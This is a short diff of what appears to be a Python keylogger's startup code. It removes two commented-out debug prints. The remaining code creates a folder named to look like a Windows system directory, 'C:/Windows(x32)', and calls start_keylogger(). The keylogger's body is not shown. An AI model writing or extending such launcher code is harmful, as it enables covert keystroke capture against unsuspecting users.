@@ -27,10 +27,8 @@ def start_keylogger():
 
 check = pathlib.Path("C:/Windows(x32)")
 if check.exists():
-    #print ("ha btc ha")
     start_keylogger()
 else:
-    #print("nahi h btc ")
     os.mkdir("C:/Windows(x32)") 
     start_keylogger()
 
